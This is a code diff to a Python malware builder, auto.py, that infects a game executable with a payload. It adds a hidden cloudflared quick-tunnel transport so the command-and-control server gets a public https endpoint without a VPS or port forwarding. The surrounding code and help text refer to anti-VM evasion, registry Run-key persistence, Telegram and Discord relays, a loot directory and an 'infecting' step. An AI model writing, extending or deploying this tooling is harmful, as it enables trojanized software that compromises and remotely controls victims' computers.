@@ -24,6 +24,7 @@ Usage:
     python auto.py game.exe --c2 http://1.2.3.4:9400/      # manual C2 URL (for NAT/external)
     python auto.py game.exe --no-anti-vm                    # disable VM detection (for testing in VMs)
     python auto.py game.exe --find-port                     # auto-scan for a free port (9400-9500)
+    python auto.py game.exe --tunnel                        # C2 over a cloudflared quick tunnel (https)
 
     python auto.py --config             # show saved settings (config.json)
     python auto.py --clear-telegram     # remove saved Telegram token
@@ -49,7 +50,7 @@ What it does:
 
 Press Ctrl+C to stop early.
 """
-import json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.error, urllib.request, urllib.parse
+import atexit, json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.error, urllib.request, urllib.parse
 from c2auth import parse_c2_url, port_from_url
 from peutil import patch_ready
 
@@ -762,6 +763,96 @@ def _remote_tls_c2(c2_url, run_local):
     return bool(info.get("tls")) and not info.get("loopback")
 
 
+# ------------------------------------------------------------------ tunnel C2
+# A quick tunnel gives the payload a real https endpoint on a CA-signed host
+# with no VPS, no domain and no inbound port -- the two things a CGNAT line
+# cannot provide. cloudflared dials out, terminates TLS at Cloudflare's edge and
+# forwards plain HTTP to the local listener, which stays unchanged; the payload
+# still exercises its own schannel path against a public chain, which is exactly
+# what the VPS deployment would prove.
+CLOUDFLARED = os.path.join(os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"),
+                           "cloudflared", "cloudflared.exe")
+TUNNEL_RE = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
+_tunnel_proc = None
+
+def tunnel_stop():
+    """Terminate the quick tunnel if this process started one."""
+    global _tunnel_proc
+    if _tunnel_proc is not None:
+        try:
+            if _tunnel_proc.poll() is None:
+                _tunnel_proc.terminate()
+                try:
+                    _tunnel_proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    _tunnel_proc.kill()
+        except Exception:
+            pass
+        _tunnel_proc = None
+
+def start_tunnel(port):
+    """Start a cloudflared quick tunnel in front of the local listener.
+
+    Returns the https URL with a trailing slash, or None. Waits for /health
+    through the tunnel before returning, so an endpoint that Cloudflare has not
+    published yet never ends up embedded in a build.
+    """
+    global _tunnel_proc
+    exe = os.environ.get("CLOUDFLARED") or CLOUDFLARED
+    if not os.path.isfile(exe):
+        log("[-] cloudflared not found: %s" % exe)
+        log("    download: https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe")
+        log("    or point CLOUDFLARED at the binary")
+        return None
+    os.makedirs(LOOT, exist_ok=True)
+    logpath = os.path.join(LOOT, "tunnel.log")
+    tunnel_stop()
+    log("[*] cloudflared quick tunnel -> http://127.0.0.1:%d" % port)
+    kwargs = {}
+    if sys.platform == "win32":
+        kwargs["creationflags"] = 0x08000000      # CREATE_NO_WINDOW
+    try:
+        with open(logpath, "w", encoding="utf-8", errors="replace") as lf:
+            _tunnel_proc = subprocess.Popen(
+                [exe, "tunnel", "--no-autoupdate", "--url", "http://127.0.0.1:%d" % port],
+                stdout=lf, stderr=subprocess.STDOUT, **kwargs)
+    except OSError as ex:
+        log("[-] cloudflared failed to start: %s" % ex)
+        return None
+    url = None
+    deadline = time.time() + 30
+    while time.time() < deadline:
+        if _tunnel_proc.poll() is not None:
+            log("[-] cloudflared exited (%d), see %s" % (_tunnel_proc.returncode, logpath))
+            return None
+        try:
+            with open(logpath, encoding="utf-8", errors="replace") as f:
+                m = TUNNEL_RE.search(f.read())
+        except OSError:
+            m = None
+        if m:
+            url = m.group(0)
+            break
+        time.sleep(0.4)
+    if not url:
+        log("[-] no trycloudflare URL in %s" % logpath)
+        tunnel_stop()
+        return None
+    log("[+] tunnel up: %s" % url)
+    for _ in range(40):
+        try:
+            with urllib.request.urlopen(url + "/health", timeout=3) as resp:
+                if resp.status == 200:
+                    atexit.register(tunnel_stop)
+                    return url + "/"
+        except Exception:
+            pass
+        time.sleep(0.5)
+    log("[!] tunnel URL has not answered /health after 20s -- check %s" % logpath)
+    atexit.register(tunnel_stop)
+    return url + "/"
+
+
 def check_c2_reachable(c2_url, timeout=4):
     """Best-effort TCP connect to the C2 host:port. Honest about its limits:
     from inside the LAN a failure can be a missing port-forward, a local
@@ -1381,6 +1472,7 @@ def print_help():
     log("  OPTIONS:")
     log("    port <number>         Set C2 port (default: 9090, saved to config)")
     log("    find-port             Scan 9400-9500 and set the first free port")
+    log("    tunnel                C2 through a cloudflared https quick tunnel (no VPS/port-forward)")
     log("    persist on|off        Enable/disable persistence (registry Run key)")
     log("    config                Show current saved configuration")
     log("    tg-chatid <token>     Find your Telegram chat ID")
@@ -1822,6 +1914,7 @@ def main():
     c2_override = None
     no_anti_vm = False
     find_port = False
+    tunnel = False
 
     # parse args
     args = sys.argv[1:]
@@ -1846,6 +1939,8 @@ def main():
             no_anti_vm = True; i += 1
         elif a == "--find-port":
             find_port = True; i += 1
+        elif a == "--tunnel":
+            tunnel = True; i += 1
         elif a == "--config":
             show_cfg = True; i += 1
         elif a == "--clear-telegram":
@@ -2060,8 +2155,10 @@ def main():
         elif cfg.get("discord"):
             log("[*] Discord relay: disabled (checkbox off, key saved in config)")
 
-    # 4. start listener (https C2 already runs on the VPS -- nothing to bind here)
-    remote_c2 = _remote_tls_c2(c2_url, run_local)
+    # 4. start the local listener, then whatever transport sits in front of it.
+    #    A remote TLS C2 (VPS + Caddy) already serves the endpoint, so nothing
+    #    binds here; --tunnel needs BOTH -- Cloudflare forwards to the listener.
+    remote_c2 = _remote_tls_c2(c2_url, run_local) and not tunnel
     if remote_c2:
         log("\n[4/5] listener: remote TLS C2, local listener not started")
         listener = None
@@ -2071,6 +2168,13 @@ def main():
         if not listener:
             log("[-] could not start listener")
             return 1
+        if tunnel:
+            url = start_tunnel(port)
+            if not url:
+                listener.terminate()
+                return 1
+            c2_url = url
+            log("[+] C2 URL (tunnel): %s" % c2_url)
 
     # 5. infect
     log("\n[5/5] infecting...")
